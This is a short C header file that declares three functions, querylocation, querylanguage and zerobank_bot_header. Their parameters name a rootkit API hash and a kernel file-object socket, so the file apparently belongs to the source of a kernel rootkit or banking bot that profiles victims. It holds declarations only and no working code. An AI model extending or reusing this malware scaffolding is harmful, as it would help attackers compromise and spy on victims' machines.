#pragma once

char *querylocation(char *buffer, IN PROOTKIT_API_HASH Hash);
char *querylanguage(char *buffer, IN PROOTKIT_API_HASH Hash);

BOOLEAN zerobank_bot_header(IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash);